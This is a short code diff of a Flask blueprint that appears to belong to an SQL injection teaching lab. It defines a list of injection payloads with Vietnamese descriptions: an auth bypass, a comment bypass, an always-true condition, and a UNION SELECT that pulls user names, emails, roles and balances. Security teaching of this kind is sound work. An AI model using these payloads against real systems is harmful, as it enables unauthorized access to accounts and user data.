@@ -5,7 +5,7 @@ sqli_bp = Blueprint("sqli", __name__)
 
 PAYLOADS = [
     {"name": "Basic Auth Bypass", "value": "' OR '1'='1", "description": "Trả về tất cả users vì điều kiện luôn đúng"},
-    {"name": "UNION Data Extract", "value": "' UNION SELECT id, username, password_hash, email, role, balance FROM users-- ", "description": "Lấy toàn bộ thông tin users bằng UNION"},
+    {"name": "UNION Data Extract", "value": "' UNION SELECT id, username, email, role, balance FROM users-- ", "description": "Lấy toàn bộ thông tin users bằng UNION (5 cột)"},
     {"name": "Comment Bypass", "value": "admin'-- ", "description": "Bỏ qua phần còn lại của query bằng comment"},
     {"name": "Always True", "value": "' OR 1=1-- ", "description": "Điều kiện luôn TRUE, bypass filter"},
 ]
